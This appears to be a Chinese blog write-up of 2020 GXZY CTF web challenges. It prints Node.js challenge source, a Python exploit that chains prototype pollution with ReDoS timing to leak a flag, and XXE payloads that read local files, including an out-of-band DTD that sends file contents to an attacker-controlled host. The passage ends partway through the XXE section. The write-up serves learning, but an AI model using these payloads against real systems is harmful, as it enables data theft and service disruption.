@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    高校战“疫”网络安全分享赛部分赛题复现 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-高校战“疫”网络安全分享赛部分赛题复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      高校战“疫”网络安全分享赛部分赛题复现
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-03-10T10:22:46.000Z" itemprop="datePublished">2020-03-10</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>GXZY CTF 几道web题目和几道web预期解的复现</p>
+<a id="more"></a>
+
+<h1 id="0x01-guess-game-redos解法"><a href="#0x01-guess-game-redos解法" class="headerlink" title="0x01 guess game redos解法"></a>0x01 guess game redos解法</h1><p>复现时题目环境已关，前面反弹shell后拷了题目的源码，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> ejs=<span class="built_in">require</span>(<span class="string">'ejs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(express.json()); <span class="comment">// for parsing application/json</span></span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));<span class="comment">// for parsing application/x-www-form-urlencoded</span></span><br><span class="line">app.use(<span class="string">'/static/'</span>,express.static(<span class="string">"./static/"</span>));</span><br><span class="line">app.engine(<span class="string">'html'</span>,ejs.__express);</span><br><span class="line">app.set(<span class="string">'view engine'</span>,<span class="string">'html'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">    <span class="string">"forbidAdmin"</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">//"enableReg" : true</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> loginHistory = [];</span><br><span class="line"><span class="keyword">var</span> adminName = <span class="string">"admin888"</span>;</span><br><span class="line"><span class="keyword">var</span> flag = <span class="string">"g3tFLAaGEAxY"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">userInfo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> logItem = &#123;<span class="string">"time"</span>:<span class="keyword">new</span> <span class="built_in">Date</span>().toString()&#125;;</span><br><span class="line">    merge(logItem,userInfo);</span><br><span class="line">    loginHistory.push(logItem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/log'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(loginHistory.length==<span class="number">0</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"no log"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.json(loginHistory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.end(<span class="string">"ok"</span>);</span><br><span class="line">    <span class="comment">//res.render("index");</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//So terrible code~</span></span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> req.body.user.username != <span class="string">"string"</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"error"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//console.log(req.body.user.username);</span></span><br><span class="line">        <span class="keyword">if</span>(config.forbidAdmin &amp;&amp; req.body.user.username.includes(<span class="string">"admin"</span>))&#123;</span><br><span class="line">            res.end(<span class="string">"any admin user has been baned"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(req.body.user.username.toUpperCase() === adminName.toUpperCase())</span><br><span class="line">                <span class="comment">//only log admin's activity</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"yes"</span>);</span><br><span class="line">                log(req.body.user);</span><br><span class="line">            res.end(<span class="string">"ok"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/verifyFlag'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//res.render("verifyFlag");</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/verifyFlag'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//let result = "Your match flag is here: ";</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">"Emm~ I won't tell you what happened! "</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> req.body.q != <span class="string">"string"</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"please input your guessing flag"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> regExp = req.body.q;</span><br><span class="line">        <span class="keyword">if</span>(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123;</span><br><span class="line">            <span class="comment">//res.end(flag);</span></span><br><span class="line">            <span class="comment">//Stop your wishful thinking and go away!</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.query.q === flag)</span><br><span class="line">            result+=flag;</span><br><span class="line">        res.end(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noDos</span>(<span class="params">regExp</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//match regExp like this will be too hard</span></span><br><span class="line">    <span class="keyword">return</span> !(regExp.length&gt;<span class="number">30</span>||regExp.match(<span class="regexp">/[)]/g</span>).length&gt;<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address;</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>由于没有拷views目录下的文件，这里的render()就注释掉了，install express和ejs后题目既可以运行了，</p>
+<p>这里参考了NU1L和<a href="https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/#menu" target="_blank" rel="noopener">de1ta</a>的wp,然后这题有个merge（）函数，</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210219757.png" alt="image-20200310210219757"></p>
+<p>和上回ichunqiu的那道nodejs题merge()函数一样，都可以进行原型链污染，然后我们找那里调用了log函数，</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210328089.png" alt="image-20200310210328089"></p>
+<p>只有在/路由在使用post方法时才会调用log函数，这里传入的是req.body.user，即我们post的data，调用这个函数，需要满足username变大写后与admin888相同，然后找可以进行污染利用的点，</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210634769.png" alt="image-20200310210634769"> </p>
+<p>看到这里/veryfyFlag路由，这里会判断config.enableReg，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">    <span class="string">"forbidAdmin"</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">//"enableReg" : true</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>enableReg是未定义的，这里可以通过原型链污染绕过，然后后面把我们输入的q给了regExp,并通过noDos函数限制了我们输入的q。之后用q对flag进行匹配，这里就可以通过，nodejs的redos攻击来盲注出flag。</p>
+<blockquote>
+<p> <strong><code>match()</code></strong> 方法检索返回一个字符串匹配正则表达式的的结果。</p>
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.match(regexp)</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
+<li><p><code>regexp</code></p>
+<p>一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp" target="_blank" rel="noopener">正则表达式</a>对象。如果传入一个非正则表达式对象，则会隐式地使用 <code>new RegExp(obj)</code> 将其转换为一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/RegExp" target="_blank" rel="noopener"><code>RegExp</code></a> 。如果你没有给出任何参数并直接使用match() 方法 ，你将会得到一 个包含空字符串的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Array" target="_blank" rel="noopener"><code>Array</code></a> ：[“”] 。</p>
+</li>
+</ul>
+<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><ul>
+<li>如果使用g标志，则将返回与完整正则表达式匹配的所有结果，但不会返回捕获组。</li>
+<li>如果未使用g标志，则仅返回第一个完整匹配及其相关的捕获组（<code>Array</code>）。 在这种情况下，返回的项目将具有如下所述的其他属性。</li>
+</ul>
+</blockquote>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/match" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/match</a></p>
+<p><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="noopener">参考</a></p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310212321951.png" alt="image-20200310212321951"></p>
+<p>就可以通过这种方式逐位盲注出后面的flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line">depth = <span class="number">5</span></span><br><span class="line">pre = <span class="string">'('</span> * depth + <span class="string">'.'</span> + <span class="string">'*)'</span> * depth +<span class="string">'[^'</span></span><br><span class="line">suf = <span class="string">']$'</span></span><br><span class="line">dict = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line">re = [] </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> dict:    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081'</span>, json = &#123;<span class="string">"user"</span>: &#123;<span class="string">"username"</span>:<span class="string">"admın888"</span>, <span class="string">"__proto__"</span>: &#123;<span class="string">"enableReg"</span>: <span class="literal">True</span>&#125;&#125;&#125;)    </span><br><span class="line">    begin = time()    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081/verifyFlag'</span>, json = &#123;<span class="string">'q'</span>: pre + c + suf&#125;)    </span><br><span class="line">    re.append([c, time() - begin])    </span><br><span class="line">    sleep(<span class="number">0.1</span>)    </span><br><span class="line">    print(pre + c + suf)    </span><br><span class="line">    print(len(pre + c + suf))    </span><br><span class="line">    print(r.text)</span><br><span class="line">re = sorted(re, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> re[::<span class="number">-1</span>][:<span class="number">3</span>]:    </span><br><span class="line">    print(<span class="string">'[*] &#123;&#125; : &#123;&#125;'</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310213622108.png" alt="image-20200310213622108"></p>
+<p>用这个脚本跑到盛前面两个的时候，跑不出了。</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310215446654.png" alt="image-20200310215446654"></p>
+<p>然后改下前面的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line">depth = <span class="number">5</span></span><br><span class="line">suf = <span class="string">']'</span>+<span class="string">'('</span> * depth + <span class="string">'.'</span> + <span class="string">'*)'</span> * depth +<span class="string">'tFLAaGEAxY'</span></span><br><span class="line">pre = <span class="string">'['</span></span><br><span class="line">dict = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line">re = [] </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> dict:    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081'</span>, json = &#123;<span class="string">"user"</span>: &#123;<span class="string">"username"</span>:<span class="string">"admın888"</span>, <span class="string">"__proto__"</span>: &#123;<span class="string">"enableReg"</span>: <span class="literal">True</span>&#125;&#125;&#125;)    </span><br><span class="line">    begin = time()    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081/verifyFlag'</span>, json = &#123;<span class="string">'q'</span>: pre + c + suf&#125;)    </span><br><span class="line">    re.append([c, time() - begin])    </span><br><span class="line">    sleep(<span class="number">0.1</span>)    </span><br><span class="line">    print(pre + c + suf)    </span><br><span class="line">    print(len(pre + c + suf))    </span><br><span class="line">    print(r.text)</span><br><span class="line">re = sorted(re, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> re[::<span class="number">-1</span>][:<span class="number">3</span>]:    </span><br><span class="line">    print(<span class="string">'[*] &#123;&#125; : &#123;&#125;'</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310215725486.png" alt="image-20200310215725486"></p>
+<p>之后又看了syclover的<a href="https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng" target="_blank" rel="noopener">wp</a></p>
+<blockquote>
+<p><code>&quot;^(?=xxx)((.*)*)*aaaaa$&quot;</code>如果匹配到xxx会无限延时，用这个可以盲注flag,结尾不能是aaaaa即可， 无限延迟题目会挂,少一个括号即可 “^(?=xxx)(.<em>)</em>aaaaa$”</p>
+<p>偷个图</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/640.webp" alt="img"></p>
+</blockquote>
+<h1 id="0x02-baby-java"><a href="#0x02-baby-java" class="headerlink" title="0x02 baby java"></a>0x02 baby java</h1><p>这道题目考点是javaxxe和fastjson反序列化的漏洞，首先页面是这样，</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311132610679.png" alt="image-20200311132610679"></p>
+<p>很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span>  <span class="meta-string">"bbbbb"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140115614.png" alt="image-20200311140115614"></p>
+<p>可以解析xml，比赛时测试带上&amp;，%就会get out hacker ，以为把&amp;和%都禁了，然后就没有然后了，还是对xxe的理解不够深入，然后继续测试，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"file:///etc/passwd"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140602422.png" alt="image-20200311140602422"></p>
+<p>这里会触发waf,从这也可以看出，触发waf的时候会返回sus waf detect ! get out bad hacker ! hint: /hint.txt，而之前返回get out hacker 可能时因为语法问题等其他原因，这里过滤了file和ftp等，而且提示我们去读hint.txt，然后尝试外带xxe，<a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">这里参考</a></p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140334086.png" alt="image-20200311140334086"></p>
+<p>开始看其他的wp上面说有用http读取了hint.txt，而且内容为pom.xml文件，以为是多行的，看了上面这篇文章后，http是不能读多行文件的，然后问了出题人<a href="https://www.cnblogs.com/tr1ple/" target="_blank" rel="noopener">tr1ple</a>师傅，hint.txt是单行的，那么http和ftp应该都可以读了，</p>
+<p>这里我们服务器放的hint.txt如下</p>
+<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311141839708.png" alt="image-20200311141839708" style="zoom:200%;">
+
+<ul>
+<li>http</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//gx.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///hint.txt"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999/?%file;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
